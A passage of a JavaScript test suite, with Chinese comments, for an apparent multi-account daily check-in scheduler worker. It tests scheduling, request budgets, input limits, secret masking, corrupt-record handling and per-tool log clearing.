  // 只过 2 分钟 —— 远小于 minIntervalSec 的 30 分钟
  const round2 = firstAccount(await tick(env, { now: now + 120, limit: 45 }).run());
  assert.equal(round2.status, "claimed", "剩余步骤应被接续，而不是报「无到期账号」");
  assert.equal(round2.steps[0].reused, true);
  assert.equal(schedOf(schedEntry(kv, "SEATR1")).resumable, false, "全部做完后清除接续标记");
});

test("登录失效不标记为可接续，避免每轮白打", async () => {
  const tools = [{
    ...FIX,
    steps: [{ id: "a", label: "甲", cost: 4, async run() { return { status: "login_required", message: "401" }; } }],
  }];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATR2");
  const now = cst(10);
  await tick(env, { now, tools }).run();
  assert.equal(schedOf(schedEntry(kv, "SEATR2")).resumable, false);
  assert.equal((await tick(env, { now: now + 120, tools }).run()).ran, 0, "等人来修，不自动重试");
});

test("真正跑过但失败的账号仍受 minIntervalSec 约束，不会每轮重试", async () => {
  const tools = [{ ...FIX, steps: [{ id: "a", label: "甲", cost: 4, async run() { return { status: "error", message: "上游 500" }; } }] }];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATE2");
  const now = cst(10);

  assert.equal(firstAccount(await tick(env, { now, tools }).run()).status, "error");
  assert.equal(schedEntry(kv, "SEATE2").lastAt, now, "跑过就该刷新 lastAt");
  assert.equal(schedEntry(kv, "SEATE2").attempts, 1);
  assert.equal((await tick(env, { now: now + 60, tools }).run()).ran, 0, "间隔未到，不该重试");
  assert.equal(firstAccount(await tick(env, { now: now + 1800, tools }).run()).status, "error", "间隔到了就该再试");
});

test("全部做完但没有领取到东西 → already，不是 claimed", async () => {
  const tools = [{ ...FIX, steps: [{ id: "a", label: "甲", cost: 4, async run() { return { status: "already", message: "今日已领" }; } }] }];
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATC2");
  assert.equal(firstAccount(await tick(env, { tools }).run()).status, "already");
});

test("多账号：预算耗尽时后面的账号顺延，不报错", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATD1");
  seedAccount(kv, "SEATD2");
  seedAccount(kv, "SEATD3");
  const summary = await tick(env, { limit: 40 }).run();
  const statuses = summary.plan[0].accounts.map((a) => a.status);
  assert.equal(statuses[0], "claimed");
  assert.ok(statuses.slice(1).includes("deferred"), `应至少有一个被顺延，实际 ${statuses.join(",")}`);
  assert.equal(summary.budget.used <= 40, true, "绝不能超预算");
});

// ═══════════ 审核结论的回归断言 ═══════════

test("[P0-1] 缺 content-length 的请求体不读、直接 413", async () => {
  const res = await hit("/account/fix/new", {
    method: "POST", env: envFor(fakeKv()), omitLength: true,
    body: form(NEW_BODY),
  });
  assert.equal(res.status, 413);
});

test("[P0-1] content-length 超上限时在读体之前就拒掉", async () => {
  const res = await hit("/account/fix/new", {
    method: "POST", env: envFor(fakeKv()),
    headers: { "content-length": String(70 * 1024) },
    body: form(NEW_BODY),
  });
  assert.equal(res.status, 413);
});

test("[P0-1] 非 urlencoded 的请求体被拒", async () => {
  for (const type of ["text/plain", "multipart/form-data; boundary=x"]) {
    const res = await hit("/account/fix/new", {
      method: "POST", env: envFor(fakeKv()),
      headers: { "content-type": type }, body: form(NEW_BODY),
    });
    assert.equal(res.status, 413, type);
  }
});

test("[P0-1] 平台未配置时连请求体都不读", async () => {
  const request = new Request("https://checkin.test/account/fix/new", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded", "content-length": "20" },
    body: form(NEW_BODY),
  });
  const response = await worker.fetch(request, { CHECKIN_KV: fakeKv() });
  assert.equal(response.status, 500);
  await response.text();
  assert.equal(request.bodyUsed, false, "未配置 PASSWORD 时不该消耗请求体");
});

fixtureTest("[P1-2] 编辑时换掉凭据导致 uid 变了：被拒，键与记录不脱钩", async () => {
  // uid 现在只有一个来源（uidOf），而这个夹具的 uidOf 取的正是 seatId ——
  // 所以"改 seatId"就等于"改 uid"，内核必须认出这是换身份而不是改备注。
  // 拒绝的依据不是"字段被保护"，而是算出来的 uid 与本页 uid 不是同一个。
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  const res = await hit("/account/fix/ABCD1234/edit", {
    method: "POST", env, body: form({ pwd: PASSWORD, label: "甲", session: "", plan: "pro", seatId: "WXYZ9999" }),
  });
  assert.equal(res.status, 409);
  assert.deepEqual([...kv.store.keys()], ["v1:acct:fix:ABCD1234"], "被拒的编辑不许留下半个账号或新键");
  assert.equal(JSON.parse(kv.store.get("v1:acct:fix:ABCD1234")).cred.seatId, "ABCD1234", "凭据不该被改掉");
  assert.match(res.text, /不是同一个|不可修改/, `要说清为什么被拒：${res.text.match(/<div class="err">[^<]*/)?.[0] ?? "没看到错误文案"}`);
  // 反过来：凭据原样重交、只改备注名，必须放行。
  // 这条比"没动凭据就不重算"更值得断言 —— 必填非敏感字段（这里的 seatId 与 plan）
  // 编辑时不能留空，所以每次编辑都必然重算一遍 uidOf；它算出同一个 uid 就该顺利通过。
  // （真正"没动凭据就不重算"的那条路径由三家真实工具的 secret 字段走，
  //   敏感字段留空 = 保持原值，credTouched 为假，压根不调 uidOf。）
  const ok = await hit("/account/fix/ABCD1234/edit", {
    method: "POST", env, body: form({ pwd: PASSWORD, label: "改个名", session: "", code: "", plan: "pro", seatId: "ABCD1234" }),
  });
  assert.equal(ok.status, 303, `凭据原样重交不该被挡：${ok.text.slice(0, 300)}`);
  assert.equal(JSON.parse(kv.store.get("v1:acct:fix:ABCD1234")).label, "改个名");
  assert.equal(JSON.parse(kv.store.get("v1:acct:fix:ABCD1234")).cred.session, SECRET_VALUE, "敏感字段不该被清空");
});

test("[P1-3] 9–12 位短凭据整串隐藏", () => {
  for (const len of [8, 9, 10, 12]) {
    const masked = maskSecret("1".repeat(len));
    assert.equal(masked.includes("1"), false, `${len} 位凭据泄露了字符`);
  }
  assert.equal(maskSecret("1234567890123"), "1234••••••••0123");
});

test("[P1-4] 编辑留空不会把 select 悄悄改回 default", () => {
  const fields = [{ key: "portal", label: "接入点", type: "select", required: true, default: "cn", options: ["cn", "sg"] }];
  const editing = coerceFields(fields, new URLSearchParams({ portal: "" }), { editing: true });
  assert.deepEqual(editing.values, {}, "编辑留空必须什么都不写");
  const creating = coerceFields(fields, new URLSearchParams({ portal: "" }));
  assert.equal(creating.values.portal, "cn", "新建时 default 仍生效");
});

test("[P1-4] 可选非敏感字段能被明确清空", () => {
  const fields = [{ key: "note", label: "备注", type: "text" }];
  const cleared = coerceFields(fields, new URLSearchParams({ note: "" }), { editing: true });
  assert.equal(cleared.values.note, "");
});

fixtureTest("[P1-5] 损坏记录可见、可删，且不会把整页拖成 500", async () => {
  const env = envFor(fakeKv());
  const kv = env.CHECKIN_KV;
  kv.store.set("v1:acct:fix:BADJSON", "{not json");
  kv.store.set("v1:acct:fix:BADSHAPE", "123");

  const page = await authed("/tool/fix", env);
  assert.equal(page.status, 200);
  assert.ok(page.text.includes("BADJSON") && page.text.includes("BADSHAPE"), "坏记录必须看得见，否则既看不见又删不掉");
  assert.ok(page.text.includes("记录损坏"));

  for (const uid of ["BADJSON", "BADSHAPE"]) {
    const del = await hit(`/account/fix/${uid}/delete`, { method: "POST", env, body: form({ pwd: PASSWORD }) });
    assert.equal(del.status, 303);
    assert.equal(kv.store.has(`v1:acct:fix:${uid}`), false, `${uid} 删不掉`);
  }
});

fixtureTest("[P1-6] 首页子请求数与账号数无关", async () => {
  const costWith = async (n) => {
    const kv = fakeKv(); const env = envFor(kv);
    seedConfig(kv);
    for (let i = 0; i < n; i += 1) {
      kv.store.set(`v1:acct:fix:SEAT${String(i).padStart(4, "0")}`, JSON.stringify({ label: "x", cred: { seatId: "s" }, updatedAt: 1 }));
    }
    kv.calls.length = 0;
    const res = await authed("/", env);
    return { calls: kv.count, status: res.status, text: res.text };
  };
  const one = await costWith(1);
  const many = await costWith(41);
  assert.equal(one.status, 200);
  assert.equal(many.status, 200);
  // 真正的不变量是"成本不随账号数增长"，而不是某个魔法数字
  assert.equal(many.calls, one.calls, `41 账号花 ${many.calls} 次，1 账号花 ${one.calls} 次 —— 又变成线性了`);
  // 界是每工具 3 次 + 汇总键 1 次 + 停用标记 1 次（FLAGS_FRAME）。
  // 写死数字会让"接第 3 家工具"变成一次假红，正如它曾经让"接第 3 家"没人注意到成本在长。
  const bound = TOOLS.length * 3 + 1 + FLAGS_FRAME;
  assert.ok(one.calls <= bound, `首页成本 ${one.calls} 次，超过按工具数算的上界 ${bound}`);
  assert.ok(one.calls < 30, `首页 ${one.calls} 次必须远低于 50 硬顶，还要留给点开卡片的空间`);
  assert.ok(many.text.includes("0/41"), `卡片应显示今日完成进度 0/41，实际片段：${many.text.match(/今日完成[^<]*/)?.[0] ?? "未找到"}`);
});

fixtureTest("[P1-6] 调度索引读取也不随账号数增长", async () => {
  const costWith = async (n) => {
    const kv = fakeKv(); const env = envFor(kv);
    seedConfig(kv);
    for (let i = 0; i < n; i += 1) {
      kv.store.set(`v1:acct:fix:S${i}`, JSON.stringify({ label: "x", cred: { seatId: `S${i}` }, updatedAt: 1 }));
    }
    const budget = makeBudget(45);
    await runTick({ env: { ...env, CHECKIN_KV: trackedKv(kv, budget) }, budget, tools: TOOLS, trigger: "manual", now: cst(10) });
    return budget.used;
  };
  const one = await costWith(1);
  const many = await costWith(41);
  assert.ok(many < 50, `41 账号的一轮花了 ${many} 次子请求，撞穿 50 硬顶`);
  assert.ok(many > one, "账号多时应当真的做了更多工作");
});

fixtureTest("[P1-6] 工具页按 list+get 取明细，但坏数据不炸", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  await createAccount(env, kv);
  assert.equal((await authed("/tool/fix", env)).status, 200);
});

test("[P2] 畸形百分号编码 → 404 而不是 500", async () => {
  assert.equal((await authed("/tool/%zz", envFor(fakeKv()))).status, 404);
});

test("[P2] 通过鉴权后，页面链接带的必须是那个正确的口令", async () => {
  const res = await hit("/help?pwd=WRONG", { env: envFor(fakeKv()), headers: { "x-pwd": PASSWORD } });
  assert.equal(res.status, 200);
  assert.ok(!res.text.includes("pwd=WRONG"), "错口令被传播进了链接");
  assert.ok(res.text.includes(`pwd=${PASSWORD}`));
});

fixtureTest("[P2] 无关路由上的 ?tool= 不参与校验", async () => {
  const env = envFor(fakeKv());
  assert.equal((await authed("/api/state?tool=fix", env)).status, 200);
  assert.equal((await authed("/?tool=whatever", env)).status, 200);
  assert.equal((await authed("/account/new?tool=fix", env)).status, 200);
});

fixtureTest("[P2] 工具页导航列出全部已注册工具", async () => {
  const env = envFor(fakeKv());
  const page = await authed("/tool/fix", env);
  for (const tool of TOOLS) assert.ok(page.text.includes(tool.name), `${tool.name} 不在导航里`);
});

test("[P2] TOOLS 按 order 排序，且注册表拒绝保留字字段", () => {
  const orders = TOOLS.map((t) => t.order ?? 0);
  assert.deepEqual(orders, [...orders].sort((a, b) => a - b));
  const keys = TOOLS.flatMap((t) => [...(t.config || []), ...(t.creds || [])].map((f) => f.key));
  assert.ok(!keys.includes("pwd") && !keys.includes("label"), "有工具用了保留字字段");
});

test("分页 list 能取全（真实 KV 每 1000 键分页，shim 默认不分页会漏测）", async () => {
  const kv = fakeKv({ pageSize: 10 });
  for (let i = 0; i < 25; i += 1) kv.store.set(`v1:acct:fix:S${i}`, "{}");
  const uids = await listUids(kv, "fix");
  assert.equal(uids.length, 25);
  assert.equal(kv.calls.filter((c) => c === "list").length, 3, "应恰好翻 3 页");
});

// ═══════════ 预算与调度的回归断言 ═══════════

function syntheticTool(id, steps) {
  return {
    id, name: id, order: 1, summary: "", config: [],
    creds: [{ key: "seatId", label: "席位", required: true }],
    schedule: { resetHour: 0, notBeforeHour: 0, minIntervalSec: 1800, maxDaily: 10, backoff: [5, 15] },
    hosts: [], uidOf: (ctx) => String(ctx.values.seatId || "").trim(),
    steps: steps || [{ id: "claim", label: "领取", cost: 4, async run() { return { status: "claimed", message: "ok", credits: 1 }; } }],
  };
}

async function tickWith(kv, tools, limit = 45, now = cst(10)) {
  const budget = makeBudget(limit);
  if (kv.advanceTo) kv.advanceTo(now * 1000); // 虚拟时钟要跟着走，否则 90 秒的锁永不过期
  const env = { ...envFor(kv), CHECKIN_KV: trackedKv(kv, budget) };
  return { budget, summary: await runTick({ env, budget, tools, trigger: "manual", now }) };
}

test("[P0-1] 调度枚举与账号数无关：3 工具 × 16 账号不撞 50 硬顶", async () => {
  const kv = fakeKv();
  const tools = ["fix", "t2", "t3"].map((id) => syntheticTool(id));
  for (const t of tools) {
    kv.store.set(`v1:tool:${t.id}`, "{}");
    for (let i = 0; i < 16; i += 1) {
      kv.store.set(`v1:acct:${t.id}:S${i}`, JSON.stringify({ label: `S${i}`, cred: { seatId: `S${i}` }, createdAt: 1, updatedAt: 1 }));
    }
  }
  const { summary } = await tickWith(kv, tools);
  assert.ok(kv.count < 50, `真实子请求 ${kv.count} 次，必须留在硬顶内`);
  assert.ok(summary.ran > 0, "一个账号都没跑到，说明枚举把整轮炸了");
});

test("[P0-2] 调度回写状态不会覆盖用户中途提交的凭据", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATC9");
  // steps 提成变量：一行里四层闭合的写法我数错过一次括号
  const clobberSteps = [{
    id: "claim", label: "领取", cost: 4,
    async run(ctx) {
      // 模拟调度跑这几秒里用户在界面换了新票据
      await saveAccount(ctx.env, "fix", {
        uid: "SEATC9", label: "new-label", values: { seatId: "SEATC9", session: "NEW-TOKEN" },
        existing: JSON.parse(kv.store.get("v1:acct:fix:SEATC9")),
      });
      return { status: "claimed", message: "ok" };
    },
  }];
  await tickWith(kv, [syntheticTool("fix", clobberSteps)]);
  const after = JSON.parse(kv.store.get("v1:acct:fix:SEATC9"));
  assert.equal(after.cred.session, "NEW-TOKEN", "调度把新凭据覆盖回了旧值");
  assert.equal(after.label, "new-label", "label 被回滚");
});

test("[P0-3] 损坏记录不参与调度，也不会被写回成僵尸", async () => {
  const kv = fakeKv();
  kv.store.set("v1:tool:fix", "{}");
  kv.store.set("v1:acct:fix:BROKEN", "{not json");
  const { summary } = await tickWith(kv, [syntheticTool("fix")]);
  assert.equal(kv.store.get("v1:acct:fix:BROKEN"), "{not json", "坏记录被调度器改写了");
  assert.equal(summary.plan[0].accounts[0].status, "error");
  assert.ok(summary.plan[0].accounts[0].message.includes("删除"));
});

test("[P1-4] 步骤实际消耗超过 cost 会被显式记下，不静默吸收", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATD8");
  const greedy = [{
    id: "greedy", label: "贪婪步骤", cost: 2,
    async run(ctx) {
      await ctx.kv.put("j1", "1"); await ctx.kv.put("j2", "1"); await ctx.kv.put("j3", "1");
      return { status: "claimed", message: "ok" };
    },
  }];
  const { summary } = await tickWith(kv, [syntheticTool("fix", greedy)]);
  // cost 2、实际 3 次 → 超支 1，必须被记下来而不是静默吸收
  assert.equal(summary.plan[0].accounts[0].steps[0].over, 1, "超支未被记录");
});

test("[加固] 空 uid 不会静默造出畸形键", async () => {
  const kv = fakeKv();
  await assert.rejects(
    () => saveAccount(envFor(kv), "fix", { uid: "", values: { seatId: "X" } }),
    /非空 uid/,
  );
  assert.equal([...kv.store.keys()].filter((k) => k.endsWith(":")).length, 0, "写出了以冒号结尾的畸形键");
});

test("[P1-4] 账本耗尽时 ctx.fetch 拒答，而不是让第 51 次请求炸掉整轮", async () => {
  const budget = makeBudget(1);
  budget.charge(1);
  await assert.rejects(() => trackedFetch(budget, ["ok.example.com"])("https://ok.example.com/x"), /预算已用尽/);
});

test("[P1-5] 账号框架开销纳入预约，账本不会一路花过上限", async () => {
  const kv = fakeKv();
  seedConfig(kv);
  for (let i = 0; i < 12; i += 1) seedAccount(kv, `SEATE${i}`);
  const { budget, summary } = await tickWith(kv, [syntheticTool("fix")], 20);
  assert.ok(budget.used <= 20, `账本花到 ${budget.used}，越过了自设上限 20`);
  assert.ok(summary.plan[0].accounts.some((a) => a.status === "deferred"), "后面的账号应被顺延");
});

test("[P1-7] 有步骤没打上游时就标记可接续", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATF1");
  const tools = [syntheticTool("fix", [
    { id: "a", label: "甲", cost: 4, async run() { return { status: "deferred", message: "装不下" }; } },
    { id: "b", label: "乙", cost: 4, dependsOn: ["a"], async run() { return { status: "claimed", message: "ok" }; } },
  ])];
  await tickWith(kv, tools);
  assert.equal(schedEntry(kv, "SEATF1").resumable, true);
});

test("[P1-8] 未识别状态不会被当成「今天已结」而上闩", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATF2");
  // 用真·不认识的状态：这类值一旦被聚合成 already，当天就再也不重试
  const tools = [syntheticTool("fix", [{ id: "a", label: "甲", cost: 4, async run() { return { status: "mystery", message: "上游给了个没见过的值" }; } }])];
  const now = cst(10);
  const first = await tickWith(kv, tools, 45, now);
  assert.equal(planOf(first.summary).accounts[0].status, "error", "未识别状态被聚合成 already 就会当天不再重试");
  const again = await tickWith(kv, tools, 45, now + 1800);
  assert.equal(again.summary.ran, 1, "30 分钟后应重试");
});

test("[P1-9] 单步 cost 超过上限时报「永远排不进」，不是无限静默顺延", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATG1");
  const tools = [syntheticTool("fix", [{ id: "huge", label: "巨步", cost: 60, async run() { throw new Error("不该执行"); } }])];
  const { summary } = await tickWith(kv, tools);
  const step = summary.plan[0].accounts[0].steps[0];
  assert.equal(step.unreachable, true);
  assert.ok(step.message.includes("永远排不进"), step.message);
});

test("[P2] 可接续的账号不受 maxDaily 挡，顺延不烧配额", async () => {
  const kv = fakeKv();
  seedAccount(kv, "SEATG2");
  seedSched(kv, "SEATG2", { attempts: 10, attemptsDate: logicalDay(0, cst(10)), resumable: true, lastStatus: "deferred" });
  const { summary } = await tickWith(kv, [syntheticTool("fix")]);
  assert.equal(summary.ran, 1, "可接续的账号不该被 maxDaily 挡在门外");
});

test("[P2] 缺 KV 绑定时调度抛清晰提示，不是 TypeError", async () => {
  const budget = makeBudget(45);
  await assert.rejects(
    () => runTick({ env: { PASSWORD }, budget, tools: [syntheticTool("fix")], now: cst(10) }),
    /缺少 KV 绑定/,
  );
});

fixtureTest("[测试保真度] scheduled 用计划时刻而非墙钟，凌晨触发也正确", async () => {
  const kv = fakeKv(); const env = envFor(kv);
  seedAccount(kv, "SEATH1");
  const logs = [];
  const orig = console.log;
  console.log = (...a) => logs.push(a.join(" "));
  try {
    // CST 03:00：FIX 的 notBeforeHour=8，应安静地不排队
    await worker.scheduled({ cron: "*/30 * * * *", scheduledTime: cst(3) * 1000 }, env);
    const early = logs.find((l) => l.startsWith("[checkin] {"));
    assert.ok(early, "应输出汇总");
    assert.equal(JSON.parse(early.replace("[checkin] ", "")).ran, 0);

    logs.length = 0;
    await worker.scheduled({ cron: "*/30 * * * *", scheduledTime: cst(10) * 1000 }, env);
    const late = logs.find((l) => l.startsWith("[checkin] {"));
    assert.equal(JSON.parse(late.replace("[checkin] ", "")).ran, 1);
  } finally {
    console.log = orig;
  }
});

// ═══════════ 运行日志 · 手动执行 · 测试按钮 ═══════════

// 泄漏夹具：把整份凭据塞进 message。三家真实站点的 401 响应体里带 token 是常规情况，
// 而内核 catch 的就是这种 error message，所以这不是编出来的极端形态。
const leakStep = (id = "claim") => ({
  id,
  label: "领取",
  cost: 4,
  async run(ctx) { throw new Error(`上游 401 body=${JSON.stringify(ctx.account.cred)}`); },
});
const PIN = "44321";                      // 5 位：WorkBuddy 短信码的形态，比旧的长度门槛还短
const credsFull = [
  { key: "seatId", label: "席位号", required: true },
  { key: "plan", label: "套餐", type: "select", options: ["free", "pro", "team"] },
  { key: "session", label: "会话票据", secret: true },
  { key: "code", label: "短信验证码", secret: true },
];
function seedFull(kv, uid) {
  seedConfig(kv);
  kv.store.set(`v1:acct:fix:${uid}`, JSON.stringify({
    label: `备注-${uid}`,
    cred: { seatId: uid, plan: "pro", session: SECRET_VALUE, code: PIN },
    createdAt: 1, updatedAt: 1,
  }));
}
const okStep = (message = "ok", credits = 1) => [{
  id: "claim", label: "领取", cost: 4, async run() { return { status: "claimed", message, credits }; },
}];
const leakyTool = (steps) => ({ ...syntheticTool("fix", steps), creds: credsFull });
const logKeys = (kv) => [...kv.store.keys()].filter((k) => k.startsWith("v1:run:") || k.startsWith("v1:tick:"));
// 日志的可见面 = 正文 + metadata（列表页只读 metadata，正文没写全也不代表干净）
const everyLogText = (kv) => logKeys(kv).map((k) => `${k}\n${kv.store.get(k)}\n${JSON.stringify(kv.metas.get(k) || {})}`).join("\n");

test("[一轮只留账号日志，不再写整轮汇总", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGA1");
  await tickWith(kv, [leakyTool(okStep())]);
  const runs = [...kv.store.keys()].filter((k) => k.startsWith("v1:run:"));
  const ticks = [...kv.store.keys()].filter((k) => k.startsWith("v1:tick:"));
  assert.equal(runs.length, 1, `账号日志应有 1 条，实际 ${runs.join(", ")}`);
  assert.equal(ticks.length, 0, `整轮汇总不该再写，实际 ${ticks.join(", ")}`);
  assert.ok(runs[0].includes("LOGA1"));
});

test("[全空转的轮什么都不写", async () => {
  const kv = fakeKv();
  // 配置齐全但一个账号都没有 → 整轮 skipped（「无到期账号」），什么都没跑
  seedConfig(kv);
  const { summary } = await tickWith(kv, [leakyTool(okStep())]);
  const ticks = [...kv.store.keys()].filter((k) => k.startsWith("v1:tick:"));
  assert.equal(ticks.length, 0, `空轮不该写汇总日志，实际 ${ticks.join(", ")}`);
  assert.equal(summary.ran, 0);
  // 空轮也不该有别的残留：调度索引、进度、心跳都不动 —— 无事发生就零写入
  assert.equal(logKeys(kv).length, 0);
});

// 清空日志：范围只限被点的那一个工具，且不能靠 GET 触发
// 用真实注册表里的 qoder —— 路由只认注册表，夹具的 "fix" 会被 404 挡掉

// 窄屏适配。2026-10-01 用户拿 390px 宽的手机截图反馈：导航折成两行（「总览」被拆成
// 「总/览」），表格 640px 撑破屏幕（时间/对象/结果三列全在屏外）。
// 这条守住两件事：窄屏媒体查询存在，且表格每格都带 data-label（卡片式排版的字段名来源）。
test("窄屏适配：导航不折行、表格卡片化所需的 data-label 齐全", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  // 手工造一条 qoder 日志：tickWith 传入的合成工具会顶掉整个注册表，造不出 qoder 的记录
  kv.store.set("v1:run:qoder:0000000000123:qdr-m1", "{}");
  const page = await hit(`/runs?pwd=${PASSWORD}`, { env });
  const css = page.text.match(/<style>([\s\S]*?)<\/style>/)[1];

  // 导航：窄屏下必须禁止折行（折行就是「总览」被拆成两字的原因）
  const navBlock = css.match(/@media \(max-width:720px\)\{[^]*?\.nav\{([^}]*)\}/);
  assert.ok(navBlock, "缺窄屏导航规则");
  assert.match(navBlock[1], /flex-wrap:nowrap/, "窄屏导航必须 nowrap，否则「总览」会被折断");
  assert.match(navBlock[1], /overflow-x:auto/, "窄屏导航要能横向滚，5 项在 360px 放不下");

  // 表格：卡片式排版依赖 td[data-label] 生成字段名，缺一个就少一个字段名
  assert.match(css, /table\.t\{min-width:0;display:block\}/, "窄屏表格没改成块级（仍在横向溢出）");
  assert.match(css, /table\.t thead\{display:none\}/, "窄屏没隐藏表头");
  assert.match(css, /content:attr\(data-label\)/, "缺 data-label 字段名生成规则");

  // 每个数据格都要有 data-label（最后一个操作列允许为空串，它有专门规则隐藏）。
  // 只在 <tbody> 片段里找：CSS 注释里写着 "<td>" 字面量，全页扫会把它当成一个缺属性的格。
  const tbody = page.text.match(/<tbody>([\s\S]*?)<\/tbody>/)[1];
  const tds = [...tbody.matchAll(/<td([^>]*)>/g)].map((m) => m[1]);
  assert.equal(tds.length, 7, `列表页每行应是 7 格，实际 ${tds.length}`);
  const missing = tds.filter((attrs) => !/data-label="/.test(attrs));
  assert.equal(missing.length, 0, `有 ${missing.length} 个 <td> 缺 data-label：${JSON.stringify(missing)}`);
  // 操作列是空串而不是缺属性 —— 两者在 CSS 里待遇不同（空串有 content:none 规则）
  assert.match(tds[tds.length - 1], /data-label=""/, "最后一格（操作列）应带空 data-label");
});

test("清空日志只删被点的那个工具，别家与账号凭据原样留着", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  // 直接造日志，不跑 tick：tickWith 传入的合成工具会顶掉整个注册表，
  // 那样造不出"两个工具各有日志"的前提，而那正是这条测试要守的不变量。
  seedQoder(kv, "qdr-clear");
  seedFull(kv, "LOGA1");
  kv.store.set("v1:run:qoder:0000000000123:qdr-clear", "{}");
  kv.store.set("v1:run:trae:0000000000456:u1", "{}");
  const before = [...kv.store.keys()].filter((k) => k.startsWith("v1:acct:")).sort();
  assert.equal(logKeys(kv).length, 2, `前置：两条日志，实际 ${logKeys(kv).join(", ")}`);

  // GET 只该读，不该写。确认页要显示"当前一页能看到 N 条"，所以一次 list 是免不了的 ——
  // 守的是"没有一次 delete / put"，不是"一个子请求都不花"。
  const before2 = kv.calls.length;
  const page = await hit(`/runs/qoder/clear?pwd=${PASSWORD}`, { env });
  assert.equal(page.status, 200, `确认页打不开：${page.text.slice(0, 200)}`);
  assert.ok(page.text.includes("确认清空"), "确认页没有实际的删除按钮");
  assert.equal(kv.calls.slice(before2).filter((op) => op === "delete" || op === "put").length, 0,
    `GET 打开确认页却动了写操作：${kv.calls.slice(before2).join(",")}`);

  // POST 才真删
  const done = await hit(`/runs/qoder/clear?pwd=${PASSWORD}`, { method: "POST", body: form({ pwd: PASSWORD }), env });
  assert.equal(done.status, 303, `删除没走重定向：${done.status}`);
  assert.match(done.headers.get("location") || "", /cleared=1&more=0/, `回执没带真实数字：${done.headers.get("location")}`);

  assert.equal([...kv.store.keys()].filter((k) => k.startsWith("v1:run:qoder:")).length, 0, "被点的工具日志没删干净");
  assert.ok(kv.store.has("v1:run:trae:0000000000456:u1"), "别家工具的日志被误删");
  assert.deepEqual([...kv.store.keys()].filter((k) => k.startsWith("v1:acct:")).sort(), before, "账号记录被误删");

  // 回执页必须把真实数字说出来。判据是 cleared 参数存在（不是 done=cleared）——
  // 写成后者的话这个分支永远进不去，界面上的回执就成了死代码。
  const back = await hit(`/runs?tool=qoder&cleared=1&more=0&pwd=${PASSWORD}`, { env });
  assert.ok(back.text.includes("已删除 1 条运行日志"), `回执没显示真实数字：${back.text.match(/已删除[^<]*/)}`);
});

test("清空日志删不完时的回执要催你再点一次，不许显示成已清空", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  const res = await hit(`/runs?tool=qoder&cleared=28&more=1&pwd=${PASSWORD}`, { env });
  assert.ok(res.text.includes("再点一次"), `删不完却没提示继续：${res.text.match(/已删除[^<]*/)}`);
  assert.ok(!res.text.includes("已删除 28 条运行日志。"), "删不完却显示成已清空");
});

test("清空日志的删除范围由注册表把关：未注册的工具 id 到不了 KV", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  kv.store.set("v1:run:evil:0000000000123:u1", "{}");
  const res = await hit(`/runs/evil/clear?pwd=${PASSWORD}`, { method: "POST", body: form({ pwd: PASSWORD }), env });
  assert.equal(res.status, 404, `未注册的工具 id 应该 404，实际 ${res.status}`);
  assert.ok(kv.store.has("v1:run:evil:0000000000123:u1"), "未注册前缀的键被删了");
});

test("清空日志删不完时必须说清还剩多少，不许谎报已清空", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  // 60 条日志 > CLEAR_BUDGET(28)：一次删不完，必须报 more
  for (let i = 0; i < 60; i += 1) {
    kv.store.set(`v1:run:qoder:${String(9000000000000 - i).padStart(13, "0")}:u${i}`, "{}");
  }
  const res = await hit(`/runs/qoder/clear?pwd=${PASSWORD}`, { method: "POST", body: form({ pwd: PASSWORD }), env });
  assert.equal(res.status, 303);
  const q = new URL(`https://x${res.headers.get("location")}`).searchParams;
  assert.equal(Number(q.get("cleared")), 28, `一次最多删 CLEAR_BUDGET 条，实际报 ${q.get("cleared")}`);
  assert.equal(q.get("more"), "1", "删不完却没报 more —— 界面会说「已清空」而库里还剩 32 条");
  assert.equal([...kv.store.keys()].filter((k) => k.startsWith("v1:run:qoder:")).length, 32, "剩下的应原样留着");
});

test("清空日志的按钮只在筛选到具体工具时出现，「全部」页不给危险操作", async () => {
  const kv = fakeKv();
  const env = envFor(kv);
  const all = await hit(`/runs?pwd=${PASSWORD}`, { env });
  assert.ok(!all.text.includes("清空日志"), "「全部」页不该出现清空按钮：那里没有「一个工具」可清，做成清空全库会误伤所有记录");
  const one = await hit(`/runs?tool=qoder&pwd=${PASSWORD}`, { env });
  assert.ok(one.text.includes("清空日志"), "筛选到具体工具时该有清空入口");
  assert.ok(one.text.includes("/runs/qoder/clear"), "清空入口的地址不对");
});

test("[运行日志带 30 天 TTL", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGA2");
    const ttls = [];
  const wrapped = {
    ...kv,
    async put(key, value, options) {
      if (key.startsWith("v1:run:")) ttls.push(options && options.expirationTtl);
      return kv.put(key, value, options);
    },
  };
  const budget = makeBudget(45);
  await runTick({ env: { PASSWORD, CHECKIN_KV: trackedKv(wrapped, budget) }, budget, tools: [leakyTool(okStep())], trigger: "manual", now: cst(10) });
  assert.equal(ttls.length, 1, "账号日志该带 TTL");
  assert.ok(ttls.every((t) => t === 30 * 86400), `TTL 应为 30 天，实际 ${ttls.join(", ")}`);
});

fixtureTest("[列表页零次 get，且摘要文本确实来自 metadata", async () => {
  const kv = fakeKv();
  seedFull(kv, "LOGB1");
  await tickWith(kv, [leakyTool(okStep("唯一摘要标记-7F3A", 7))]);
  kv.calls.length = 0;
  const res = await authed("/runs", envFor(kv));
  assert.equal(res.status, 200);
  assert.equal(kv.calls.filter((c) => c === "get").length, 0, "列表页一次正文都不该读，摘要全在 metadata 里");
  // 这条才是"摘要进 metadata"设计的真守卫：没读正文，页面上却出现了正文里才有的摘要。
